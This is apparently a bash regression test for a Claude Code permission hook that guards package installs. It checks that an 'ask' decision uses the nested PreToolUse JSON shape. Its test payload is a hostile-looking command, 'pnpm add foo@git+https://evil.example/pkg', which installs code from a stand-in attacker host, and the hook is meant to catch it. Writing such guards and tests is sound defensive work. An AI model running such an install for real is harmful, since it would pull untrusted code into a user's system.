#!/usr/bin/env bash
#
# Regression test for task #127/#128 — safe-package-change.sh's "ask" cases
# must emit the CONTRACT-CORRECT nested PreToolUse permission-decision shape:
#   {hookSpecificOutput: {hookEventName: "PreToolUse", permissionDecision: "ask", ...}}
# and NOT the invalid top-level shape `{permissionDecision:"ask",...}` that
# Claude Code silently degrades to allow (an "ask" that never asks).
#
# Scenario driving the ask path: `pnpm add foo@git+https://evil.example/pkg`
# hits the non-registry-version-specifier rule (a pure `case`-statement regex
# check on the parsed version spec — see safe-package-change.sh's
# analyse_package(), step 2). That check runs before any network-dependent
# step, so this scenario reaches the ask/exit-0 path deterministically without
# ever needing the remote `pnpm view` lookups (age/lifecycle-scripts/bin) to
# succeed or fail a particular way. A `pnpm` stub is still put first on PATH
# so those later steps (4-6 in analyse_package) resolve instantly with no
# data, instead of burning wall-clock time on a real (network-dependent)
# `pnpm view` call that would only fail-soft and report empty anyway.
#
# Hermetic: no network. The `pnpm` on PATH is a local stub; jq/python3 (used
# for Levenshtein distance in the typosquat check) come from the host but
# take no network input.
#
# Run:  hooks/tests/safe-package-change-ask-schema.test.sh
# Exit: 0 = all assertions pass, 1 = at least one failed.

set -uo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/../.." && pwd)"
HOOK="$REPO_ROOT/hooks/safe-package-change.sh"

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

fails=0
pass() { printf '  PASS: %s\n' "$1"; }
fail() { printf '  FAIL: %s\n' "$1"; fails=$((fails + 1)); }

command -v jq >/dev/null 2>&1 || { echo "  SKIP: jq not on PATH"; exit 0; }

# --- pnpm stub: instant, no-network answers for `pnpm view <pkg> <field> --json`
# Every remote lookup in analyse_package() (age/lifecycle-scripts/bin) treats
# empty output as "no data" and fails soft — this keeps the ask path
# deterministic and fast without ever touching the network.
mkdir -p "$TMP/bin"
cat > "$TMP/bin/pnpm" <<'SHIMEOF'
#!/usr/bin/env bash
# Minimal pnpm stub — only `pnpm view <pkg> <field> --json` is invoked by
# safe-package-change.sh's analyse_package(); always answer empty (no data).
exit 0
SHIMEOF
chmod +x "$TMP/bin/pnpm"
export PATH="$TMP/bin:$PATH"

payload='{"tool_name":"Bash","tool_input":{"command":"pnpm add foo@git+https://evil.example/pkg"}}'

OUT="$TMP/out"
ERR="$TMP/err"
CLAUDE_PLUGIN_ROOT="$REPO_ROOT" \
CLAUDE_PROJECT_DIR="$TMP/logs" \
  bash "$HOOK" <<<"$payload" >"$OUT" 2>"$ERR"
code=$?

# (1) exit code 0 — an "ask" escalation is signalled via stdout JSON, not a
#     non-zero exit (exit 2 is reserved for hard blocks).
if [ "$code" -eq 0 ]; then
  pass "exit code 0 (ask escalations do not block)"
else
  fail "expected exit code 0, got $code (stderr: $(cat "$ERR"))"
fi

# (2) stdout is the contract-correct nested shape.
if jq -e '.hookSpecificOutput.hookEventName == "PreToolUse" and .hookSpecificOutput.permissionDecision == "ask"' "$OUT" >/dev/null 2>&1; then
  pass "stdout is the nested {hookSpecificOutput:{hookEventName,permissionDecision:\"ask\"}} shape"
else
  fail "stdout did not match the nested ask shape — got: $(cat "$OUT")"
fi

# (3) the INVALID top-level shape ({permissionDecision:"ask",...} at the
#     document root) is gone — top-level .permissionDecision must be null.
if jq -e '.permissionDecision == null' "$OUT" >/dev/null 2>&1; then
  pass "top-level .permissionDecision is null (invalid top-level shape is gone)"
else
  fail "top-level .permissionDecision was NOT null — invalid shape still present: $(cat "$OUT")"
fi

echo ""
if [ "$fails" -eq 0 ]; then
  echo "safe-package-change-ask-schema (#127/#128): all assertions passed."
  exit 0
else
  echo "safe-package-change-ask-schema (#127/#128): $fails assertion(s) failed."
  exit 1
fi
